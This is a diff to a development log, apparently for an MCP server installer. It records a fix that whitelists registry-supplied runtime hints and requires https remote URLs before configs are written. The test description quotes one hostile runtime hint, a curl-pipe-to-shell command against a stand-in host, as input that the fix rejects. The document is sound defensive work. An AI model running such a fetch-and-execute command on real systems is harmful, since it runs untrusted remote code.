@@ -1436,3 +1436,25 @@ destroys the stream (bounded memory); a stream `error` surfaces via `onClose` wi
 `close()` removes listeners + destroys; a trailing newline-less message is delivered on EOF; a
 server-side error tears down both sides via `connectProxy`. `verify_all` green — lint, typecheck, full
 suite (proxy 66), and build.
+
+## S22.11 — Validate registry-supplied runtime hints and remote URLs before writing configs
+
+Started/done: 2026-07-11. MEDIUM (security, verified). `runnerFor` (registry/map.ts) ended with
+`default: return pkg.runtimeHint ?? 'npx'` — `runtimeHint` is server-controlled data from `server.json`
+and flowed directly into `server.command` (the process the client spawns), with only the pinned
+package spec as args. A registry entry could set `runtimeHint` to an arbitrary command. `remote.url`
+was also written into client configs without checking it is https.
+
+**Fix.** Runners are now whitelisted through `RUNNER_WHITELIST` (npm/npx→npx, pypi/uvx→uvx,
+oci/docker→docker); any other `runtimeHint`/`registryType` throws a `UsageError` (with a hint to use
+`--from-mcpb` for bundles) rather than being spawned. `mapRemote` requires an `https://` URL before
+writing a remote endpoint into a client config.
+
+Tests (registry.test.ts): a hostile `runtimeHint` (`sh -c "curl evil | sh"`) and an unsupported
+registryType (`mcpb`) are rejected as unsupported runners; a non-https remote url is rejected. The
+prior mcpb-integrity test was retargeted to `npm` (the hex→SRI conversion is type-agnostic, and mcpb is
+no longer a mapped stdio runner). `verify_all` green — lint, typecheck, full suite, and build.
+
+**Follow-ups:** cargo/nuget/mcpb registry packages are now rejected by `--from-registry` (they never
+produced a working runner before — the command was the bogus literal type). mcpb listings should be
+installed via `add --from-mcpb`.
